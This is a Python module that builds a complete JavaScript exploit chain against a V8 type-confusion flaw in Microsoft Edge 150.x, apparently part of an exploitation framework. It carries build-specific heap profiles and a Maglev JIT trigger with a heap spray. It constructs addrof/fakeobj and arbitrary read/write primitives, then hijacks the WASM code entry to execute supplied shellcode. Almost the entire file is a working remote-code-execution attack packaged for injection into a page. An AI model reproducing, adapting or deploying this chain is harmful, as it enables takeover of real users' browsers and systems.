#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JS exploit chain builder for CVE-2026-58289 (Edge V8 type confusion).

Public PoC only proves a crash at 0x41414141 when writing the marker.
Full RCE requires post-trigger primitives; this module implements the
standard Chromium chain used in KittySploit Chrome exploits:

  1) Trigger + heap reclaim/spray
  2) Fake PACKED_DOUBLE array / addrof / fakeobj
  3) Arbitrary read/write via corrupted backing store
  4) WASM code-entry hijack + shellcode

Stage 1 follows the published 58289 layout; stages 2-4 reuse the calibrated
WASM chain pattern (Edge 150.x ≈ Chrome 144 V8 — tune qword1_bits if needed).
"""

from __future__ import annotations

import re
from typing import Any, Dict, Optional, Tuple

from lib.js.generic import exploit_debug_helpers, maglev_optimizer_helpers


def _normalize_version_tuple(version: str) -> Tuple[int, ...]:
    parts = []
    for piece in re.split(r"[.\-+]", str(version or "").strip()):
        if piece.isdigit():
            parts.append(int(piece))
        else:
            match = re.match(r"^(\d+)", piece or "")
            if match:
                parts.append(int(match.group(1)))
            else:
                break
    return tuple(parts)


def _pad_tuple(value: Tuple[int, ...], width: int) -> Tuple[int, ...]:
    if len(value) >= width:
        return value[:width]
    return value + (0,) * (width - len(value))


def _tuple_starts_with(version: Tuple[int, ...], prefix: Tuple[int, ...]) -> bool:
    if len(version) < len(prefix):
        return False
    return version[: len(prefix)] == prefix


def _tuple_lte(left: Tuple[int, ...], right: Tuple[int, ...]) -> bool:
    width = max(len(left), len(right))
    return _pad_tuple(left, width) <= _pad_tuple(right, width)


# Per-build V8 heap profiles for Edge 150.x (CVE-2026-58289 full chain).
# edge_150_4070 matches the public PoC tested build (150.0.4070.x on Windows 11).
EDGE_V8_PROFILES: Dict[str, Dict[str, Any]] = {
    "edge_150_4070": {
        "label": "Edge 150.0.4070.x (PoC tested, Windows 11)",
        "version_prefix": (150, 0, 4070),
        "version_max": (150, 0, 4078, 47),
        "qword1_bits": "0x0000000401022bd5",
        "packed_double_array_map": "0x0100d0d5",
        "warmup_iterations": 10000,
        "array_size": 0x100,
        "spray_rounds": 1500,
        "maglev_attempts": 2,
    },
    "edge_150_4075": {
        "label": "Edge 150.0.4075.x (late pre-patch 150.x)",
        "version_prefix": (150, 0, 4075),
        "version_max": (150, 0, 4078, 47),
        "qword1_bits": "0x0000000401022bd5",
        "packed_double_array_map": "0x0100d0d5",
        "warmup_iterations": 10000,
        "array_size": 0x100,
        "spray_rounds": 1800,
        "maglev_attempts": 3,
    },
    "edge_150_4078_pre": {
        "label": "Edge 150.0.4078.0–47 (last vulnerable builds)",
        "version_prefix": (150, 0, 4078),
        "version_max": (150, 0, 4078, 47),
        "qword1_bits": "0x0000000401022bd5",
        "packed_double_array_map": "0x0100d0d5",
        "warmup_iterations": 10000,
        "array_size": 0x100,
        "spray_rounds": 2000,
        "maglev_attempts": 3,
    },
    "edge_150_generic": {
        "label": "Edge 150.x generic (fallback — tune qword1_bits if stage3 fails)",
        "majors": (150,),
        "qword1_bits": "0x0000000401022bd5",
        "packed_double_array_map": "0x0100d0d5",
        "warmup_iterations": 10000,
        "array_size": 0x100,
        "spray_rounds": 1500,
        "maglev_attempts": 2,
    },
}

EDGE_V8_DEFAULTS: Dict[str, Any] = dict(EDGE_V8_PROFILES["edge_150_4070"])
EDGE_V8_DEFAULT_PROFILE = "edge_150_4070"


def profile_matches_version(profile: Dict[str, Any], version: Tuple[int, ...]) -> bool:
    if not version:
        return False
    prefix = profile.get("version_prefix")
    if prefix:
        if not _tuple_starts_with(version, tuple(prefix)):
            return False
        version_max = profile.get("version_max")
        if version_max and not _tuple_lte(version, tuple(version_max)):
            return False
        return True
    majors = profile.get("majors")
    if majors:
        return version[0] in tuple(majors)
    return False


def profile_specificity(profile: Dict[str, Any]) -> int:
    prefix = profile.get("version_prefix")
    if prefix:
        return len(tuple(prefix)) * 10
    majors = profile.get("majors")
    if majors:
        return 1
    return 0


def resolve_edge_v8_profile(
    edge_version: Optional[str] = None,
    profile_key: str = "auto",
    *,
    overrides: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Pick the best V8 profile for an Edge build string or explicit profile key."""
    key = str(profile_key or "auto").strip()
    version_tuple = _normalize_version_tuple(edge_version or "")

    if key != "auto":
        if key not in EDGE_V8_PROFILES:
            raise ValueError(f"Unknown edge v8 profile: {key!r}")
        profile = dict(EDGE_V8_PROFILES[key])
        profile["key"] = key
    else:
        matches = []
        for candidate, profile in EDGE_V8_PROFILES.items():
            if profile_matches_version(profile, version_tuple):
                matches.append((profile_specificity(profile), candidate, profile))
        if matches:
            matches.sort(key=lambda item: item[0], reverse=True)
            _, selected_key, selected = matches[0]
        else:
            selected_key = EDGE_V8_DEFAULT_PROFILE
            selected = EDGE_V8_PROFILES[selected_key]
        profile = dict(selected)
        profile["key"] = selected_key

    profile["edge_version"] = edge_version or ""
    if overrides:
        for name, value in overrides.items():
            if value is not None and str(value).strip() != "":
                profile[name] = value
    return profile


def _hex_literal(value: str) -> str:
    text = str(value).strip().lower()
    if not text.startswith("0x"):
        text = "0x" + text
    return f"{text}n"


def build_full_chain_body(
    shellcode_js: str,
    *,
    warmup: int = 10000,
    array_size: int = 0x100,
    spray_rounds: int = 1500,
    spray_count: int = 50,
    spray_array_len: int = 16,
    maglev_attempts: int = 2,
    qword1_bits: str = EDGE_V8_DEFAULTS["qword1_bits"],
    packed_double_array_map: str = EDGE_V8_DEFAULTS["packed_double_array_map"],
    profile_label: str = "",
) -> str:
    """Return exploit JS body (inside Promise wrapper) for the full chain."""
    qword1 = _hex_literal(qword1_bits)
    packed_map = _hex_literal(packed_double_array_map)

    return f"""
    klog("[*] CVE-2026-58289 full chain — Edge V8 type confusion → WASM shellcode", "stage");
    klog("[*] V8 profile: {profile_label or 'custom'}", "info");

    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u64 = new BigUint64Array(buf);
    function itof(x) {{ u64[0] = BigInt.asUintN(64, x); return f64[0]; }}
    function ftoi(x) {{ f64[0] = x; return u64[0]; }}
    function hex(x) {{ return "0x" + x.toString(16); }}

    const WARMUP_ITERS = {max(500, int(warmup))};
    const ARRAY_SIZE = {max(1, int(array_size))};
    const MAX_SMI = 0x3fffffff;
    const SPRAY_ROUNDS = {max(1, int(spray_rounds))};
    const SPRAY_COUNT = {max(1, int(spray_count))};
    const SPRAY_ARRAY_LEN = {max(4, int(spray_array_len))};
    const MAX_ATTEMPTS = {max(1, int(maglev_attempts))};

    const QWORD1_BITS = {qword1};
    const BOOTSTRAP_QWORD0 = 4.2885618090673e-311;
    const BOOTSTRAP_QWORD1 = itof(QWORD1_BITS);
    const PACKED_DOUBLE_ARRAY_MAP = {packed_map};
    const FAKE_DOUBLE_ARRAY_LENGTH_SMI = 0x20n;
    const BACKING_ELEMENTS = (QWORD1_BITS & 0xffffffffn) - 0x10n;
    const BACKING_PAYLOAD = BACKING_ELEMENTS + 0x7n;
    const FAKE_DOUBLE_ARRAY_ADDR = BACKING_PAYLOAD + 0x1n;

    // --- Stage 1: published CVE-2026-58289 layout (no crash marker) ---
    function dummyFunc(o) {{ return o.a + o.b; }}

    function stage1_layout() {{
        klog("[*] Stage 1 — 58289 heap layout + dummyFunc warmup", "stage");
        const obj1 = {{ a: 1, b: 2 }};
        for (let i = 0; i < WARMUP_ITERS; i++) dummyFunc(obj1);
        const arr = new Array(ARRAY_SIZE);
        arr.length;
        return {{ triggerObj: obj1, arr: arr }};
    }}

    // --- Stage 2: Maglev-optimized trigger (Chromium JIT path to fake object) ---
    function blah(o, a, b, x) {{
        let y = a ? x + 1 : 1;
        const t = y | 0;
        let z = b ? y : 1;
        o.x = z;
        return t;
    }}

    function make_arr() {{
        const spray = [];
        for (let i = 0; i < SPRAY_ARRAY_LEN; i++) {{
            spray.push((i % 2) === 0 ? BOOTSTRAP_QWORD0 : BOOTSTRAP_QWORD1);
        }}
        return spray;
    }}

    function spray() {{
        for (let round = 0; round < SPRAY_ROUNDS; round++) {{
            const tmp = [];
            for (let i = 0; i < SPRAY_COUNT; i++) tmp.push(make_arr());
        }}
    }}

    function forceMajorGc(rounds) {{
        if (typeof gc !== "function") return;
        for (let i = 0; i < rounds; i++) gc({{ type: "major" }});
    }}

    function maglevTriggerOk(obj) {{
        return typeof obj.x === "object" && obj.x !== null && Array.isArray(obj.x) && obj.x.length === 2;
    }}

    function stage2_maglev_trigger(triggerObj) {{
        klog("[*] Stage 2 — Maglev trigger for fake PACKED_DOUBLE reclaim", "stage");
        const obj = {{ x: 1 }};
        const warmup = {{ x: 1 }};
        const hasGc = typeof gc === "function";
        const maglevNative = ksMaglevNativeAvailable(blah);

        if (!hasGc) {{
            klog("[!] gc() missing — launch Edge with --js-flags=--expose-gc", "warn");
        }}
        if (!maglevNative) {{
            klog("[!] Maglev natives missing — --js-flags='--maglev --no-turbofan --allow-natives-syntax'", "warn");
        }}

        for (let i = 0; i < Math.min(WARMUP_ITERS, 8000); i++) {{
            blah(warmup, true, true, i & 1023);
            blah(warmup, false, true, i & 1023);
            blah(warmup, true, false, i & 1023);
        }}

        if (maglevNative) ksOptimizeMaglevBlah(blah);
        blah(warmup, true, true, 7);

        for (let attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {{
            obj.x = 1;
            if (attempt > 0) {{
                forceMajorGc(2);
                if (maglevNative) ksOptimizeMaglevBlah(blah);
                blah(warmup, true, true, 7);
            }}
            blah(obj, true, true, MAX_SMI);
            forceMajorGc(1);
            spray();
            if (maglevTriggerOk()) {{
                klog("[+] Stage 2 OK — fake object reclaimed (attempt " + (attempt + 1) + ")", "success");
                return {{ ok: true, fake: obj.x, triggerObj: triggerObj }};
            }}
            klog("[-] attempt " + (attempt + 1) + ": typeof obj.x=" + typeof obj.x + " val=" + obj.x, "warn");
        }}
        return {{ ok: false, reason: "Maglev trigger did not yield fake array (obj.x stayed scalar)" }};
    }}

    // --- Stage 3-4: addrof / fakeobj / arbitrary RW (WASM chain) ---
    function stage3_primitives(fakeObj) {{
        klog("[*] Stage 3 — addrof / fakeobj / arbitrary RW", "stage");
        const backing = [13.371337, 37.1337, 73.7331, 31.3373];

        function addrof(v) {{
            backing[2] = 0;
            fakeObj[0] = v;
            return ftoi(backing[2]) & 0xffffffffn;
        }}
        function fakeobj(addr) {{
            backing[2] = itof(addr);
            return fakeObj[0];
        }}

        const targetA = {{ marker: 13.37 }};
        const targetB = {{ marker: 42.42 }};
        const addrA = addrof(targetA);
        const addrB = addrof(targetB);
        if (!(addrA !== addrB && fakeobj(addrA) === targetA && fakeobj(addrB) === targetB)) {{
            return {{ ok: false, reason: "addrof/fakeobj validation failed" }};
        }}
        klog("[+] addrof/fakeobj OK", "success");

        const EMPTY_FIXED_ARRAY = 0x000007e5n;
        backing[0] = itof((EMPTY_FIXED_ARRAY << 32n) | PACKED_DOUBLE_ARRAY_MAP);
        backing[1] = itof((FAKE_DOUBLE_ARRAY_LENGTH_SMI << 32n) | BACKING_ELEMENTS);
        const arb = fakeobj(FAKE_DOUBLE_ARRAY_ADDR);

        function setArbElements(rawAddr) {{
            backing[1] = itof((FAKE_DOUBLE_ARRAY_LENGTH_SMI << 32n) | ((rawAddr - 0x7n) & 0xffffffffn));
        }}
        function weakRead64(rawAddr) {{ setArbElements(rawAddr); return ftoi(arb[0]); }}
        function weakWrite64(rawAddr, value) {{ setArbElements(rawAddr); arb[0] = itof(value); }}

        if (weakRead64(BACKING_PAYLOAD) !== ((EMPTY_FIXED_ARRAY << 32n) | PACKED_DOUBLE_ARRAY_MAP)) {{
            return {{ ok: false, reason: "Weak arbitrary read setup failed — tune qword1_bits / V8 profile" }};
        }}

        const victimBuf = new ArrayBuffer(0x40);
        const victimView = new DataView(victimBuf);
        victimView.setBigUint64(0, 0x1122334455667788n, true);
        const arbBuf = new ArrayBuffer(0x40);
        const arbView = new DataView(arbBuf);
        const victimBufAddr = addrof(victimBuf);
        const arbBufAddr = addrof(arbBuf);

        function getBackingStoreCandidates(arrayBufferAddr) {{
            const candidates = [];
            function addCandidate(off) {{
                const field = (arrayBufferAddr - 0x1n) + off;
                const value = weakRead64(field);
                if (value > 0x10000000000n && (value & 0x7n) === 0n) candidates.push([off, field, value]);
            }}
            addCandidate(0x24n);
            for (let off = 0x10n; off <= 0x38n; off += 0x4n) {{
                if (off !== 0x24n) addCandidate(off);
            }}
            return candidates;
        }}

        const victimBackingCandidates = getBackingStoreCandidates(victimBufAddr);
        if (!victimBackingCandidates.length) {{
            return {{ ok: false, reason: "ArrayBuffer backing_store not found" }};
        }}

        let strongBackingStoreField = 0n;
        for (let i = 0; i < victimBackingCandidates.length; i++) {{
            const candidate = victimBackingCandidates[i];
            const field = (arbBufAddr - 0x1n) + candidate[0];
            const victimBacking = candidate[2];
            weakWrite64(field, victimBacking);
            if (arbView.getBigUint64(0, true) !== 0x1122334455667788n) continue;
            arbView.setBigUint64(0, 0x4142434445464748n, true);
            if (victimView.getBigUint64(0, true) === 0x4142434445464748n) {{
                strongBackingStoreField = field;
                break;
            }}
            victimView.setBigUint64(0, 0x1122334455667788n, true);
        }}
        if (strongBackingStoreField === 0n) {{
            return {{ ok: false, reason: "Strong arbitrary read/write setup failed" }};
        }}

        function strongRead64(addr) {{
            weakWrite64(strongBackingStoreField, addr);
            return arbView.getBigUint64(0, true);
        }}
        function strongWrite64(addr, value) {{
            weakWrite64(strongBackingStoreField, addr);
            arbView.setBigUint64(0, value, true);
        }}

        klog("[+] Stage 3 OK — strong arbitrary RW", "success");
        return {{ ok: true, strongRead64: strongRead64, strongWrite64: strongWrite64, addrof: addrof }};
    }}

    // --- Stage 5: WASM code entry hijack ---
    function stage5_wasm(prims) {{
        klog("[*] Stage 5 — WASM code-entry shellcode hijack", "stage");
        const wasmCode = new Uint8Array([
            0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127,
            3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 6, 1, 4, 0, 65, 42, 11
        ]);
        const wasmModule = new WebAssembly.Module(wasmCode);
        const wasmInstance = new WebAssembly.Instance(wasmModule);
        const wasmMain = wasmInstance.exports.main;
        const wasmInstanceAddr = prims.addrof(wasmInstance);
        const trustedDataTagged = prims.strongRead64((wasmInstanceAddr - 0x1n) + 0x8n) >> 32n;
        const jumpTableStart = prims.strongRead64((trustedDataTagged - 0x1n) + 0x28n);
        const jumpStub = prims.strongRead64(jumpTableStart);
        const jumpRel = (jumpStub >> 8n) & 0xffffffffn;
        const wasmCodeEntry = jumpTableStart + 0x5n + jumpRel;
        klog("[+] wasm code entry = " + hex(wasmCodeEntry), "success");

        const shellcode = {shellcode_js};
        for (let i = 0; i < shellcode.length; i += 8) {{
            let qword = 0n;
            for (let j = 0; j < 8 && (i + j) < shellcode.length; j++) {{
                qword |= BigInt(shellcode[i + j] & 0xff) << BigInt(j * 8);
            }}
            prims.strongWrite64(wasmCodeEntry + BigInt(i), qword);
        }}
        klog("[+] shellcode written (" + shellcode.length + " bytes)", "success");
        wasmMain();
        return {{ ok: true, wasm_entry: hex(wasmCodeEntry) }};
    }}

    // --- Run chain ---
    const s1 = stage1_layout();
    const s2 = stage2_maglev_trigger(s1.triggerObj);
    if (!s2.ok) {{
        resolve(finish(false, "stage2_maglev", s2.reason || "fake object not obtained"));
        return;
    }}
    const s3 = stage3_primitives(s2.fake);
    if (!s3.ok) {{
        resolve(finish(false, "stage3_primitives", s3.reason || "primitives failed"));
        return;
    }}
    const s5 = stage5_wasm(s3);
    if (!s5.ok) {{
        resolve(finish(false, "stage5_wasm", s5.reason || "wasm hijack failed"));
        return;
    }}
    resolve(finish(true, "shell", "Full chain completed — shellcode invoked via WASM entry", s5));
"""


def bundle_full_chain_js(
    shellcode_js: str,
    title: str,
    subtitle: str,
    *,
    debug_enabled: bool = True,
    **chain_kwargs: Any,
) -> str:
    """Build complete injectable JS for the full exploit chain."""
    from lib.js.generic import (
        bundle_with_generic_lib,
        exploit_debug_bootstrap,
        wrap_visual_exploit_script,
    )

    body = build_full_chain_body(shellcode_js, **chain_kwargs)
    boot = exploit_debug_bootstrap(title, subtitle, enabled=debug_enabled)
    helpers = exploit_debug_helpers() + maglev_optimizer_helpers()
    wrapped = wrap_visual_exploit_script(body, boot, helpers, paint_delay_ms=150)
    return bundle_with_generic_lib(wrapped)
